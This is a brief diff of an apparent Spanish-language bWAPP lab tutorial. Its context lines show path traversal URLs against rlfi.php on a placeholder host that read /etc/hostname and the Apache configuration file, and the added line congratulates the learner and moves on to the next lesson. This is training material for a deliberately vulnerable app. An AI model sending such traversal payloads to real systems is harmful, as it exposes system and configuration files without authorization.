@@ -41,3 +41,4 @@ http://<tu_ip>/bWAPP/rlfi.php?language=../../../../etc/hostname&action=go
 http://<tu_ip>/bWAPP/rlfi.php?language=../../../../etc/apache2/apache2.conf&action=go
 ```
 
+Si lograste los resultados esperados, ¡felicitaciones! ve a la siguiente leccion `-->`
